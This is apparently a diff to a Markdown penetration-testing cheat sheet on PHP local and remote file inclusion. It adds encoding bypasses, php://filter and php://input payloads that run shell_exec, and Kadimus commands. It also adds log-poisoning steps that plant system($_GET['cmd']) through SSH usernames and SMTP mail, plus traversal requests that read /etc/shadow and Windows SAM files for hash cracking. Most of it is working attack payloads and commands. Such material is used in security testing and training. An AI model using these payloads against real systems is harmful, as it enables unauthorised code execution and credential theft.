@@ -6,9 +6,11 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Basic LFI](#basic-lfi)
     * [Null byte](#null-byte)
     * [Double encoding](#double-encoding)
+    * [UTF-8 encoding](#utf-8-encoding)
     * [Path and dot truncation](#path-and-dot-truncation)
     * [Filter bypass tricks](#filter-bypass-tricks)
 * [Basic RFI](#basic-rfi)
@@ -26,6 +28,13 @@
 * [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+* [LFI to RCE via credentials files](#lfi-o-rce-via-credentials-files)
+
+## Tools
+
+* [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
+* [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
+* [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
 
 ## Basic LFI
 
@@ -37,6 +46,8 @@ http://example.com/index.php?page=../../../etc/passwd
 
 ### Null byte
 
+:warning: In versions of PHP below 5.3.4 we can terminate with null byte.
+
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
@@ -46,6 +57,13 @@ http://example.com/index.php?page=../../../etc/passwd%00
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+### UTF-8 encoding
+
+```powershell
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 
 ### Path and dot truncation
@@ -104,6 +122,7 @@ The part "php://filter" is case insensitive
 
 ```powershell
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
@@ -114,7 +133,14 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+NOTE: Wrappers can be chained multiple times using `|` or `/`: 
+- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
+- deflate then base64encode (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
+
+```powershell
+./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
+curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
+```
 
 ### Wrapper zip://
 
@@ -145,11 +171,16 @@ http://example.com/index.php?page=expect://ls
 
 ### Wrapper input://
 
-Specify your payload in the POST parameters
+Specify your payload in the POST parameters, this can be done with a simple `curl` command.
 
 ```powershell
-http://example.com/index.php?page=php://input
-POST DATA: <?php system('id'); ?>
+curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
+```
+
+Alternatively, Kadimus has a module to automate this attack.
+
+```powershell
+./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
 ```
 
 ### Wrapper phar://
@@ -243,8 +274,13 @@ print('[x] Something went wrong, please try again')
 
 ## LFI to RCE via phpinfo()
 
-https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
+
+> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
+
 Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
 
 ## LFI to RCE via controlled log file
 
@@ -253,12 +289,59 @@ Just append your PHP code into the log file by doing a request to the service (A
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
+http://example.com/index.php?page=/var/log/nginx/access.log
+http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
 http://example.com/index.php?page=/var/log/sshd.log
 http://example.com/index.php?page=/var/log/mail
 http://example.com/index.php?page=/var/log/httpd/error_log
 http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
+```
+
+### RCE via SSH
+
+Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
+
+```powershell
+ssh <?php system($_GET["cmd"]);?>@10.10.10.10
+```
+
+Then include the SSH log files inside the Web Application.
+
+```powershell
+http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```
+
+### RCE via Mail
+
+First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.
+
+```powershell
+root@kali:~# telnet 10.10.10.10. 25
+Trying 10.10.10.10....
+Connected to 10.10.10.10..
+Escape character is '^]'.
+220 straylight ESMTP Postfix (Debian/GNU)
+helo ok
+250 straylight
+mail from: mail@example.com
+250 2.1.0 Ok
+rcpt to: root
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject: <?php echo system($_GET["cmd"]); ?>
+data2
+.
+```
+
+In some cases you can also send the email with the `mail` command line.
+
+```powershell
+mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
 
 ## LFI to RCE via PHP sessions
@@ -270,7 +353,7 @@ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files
+In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
@@ -289,6 +372,31 @@ Use the LFI to include the PHP session file
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
+## LFI to RCE via credentials files
+
+This method require high privileges inside the application in order to read the sensitive files.
+
+### Windows version
+
+First extract `sam` and `system` files.
+
+```powershell
+http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
+http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
+```
+
+Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.
+
+### Linux version
+
+First extract `/etc/shadow` files.
+
+```powershell
+http://example.com/index.php?page=../../../../../../etc/shadow
+```
+
+Then crack the hashes inside in order to login via SSH on the machine.
+
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
@@ -303,6 +411,5 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 * [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
 * [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
-* [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
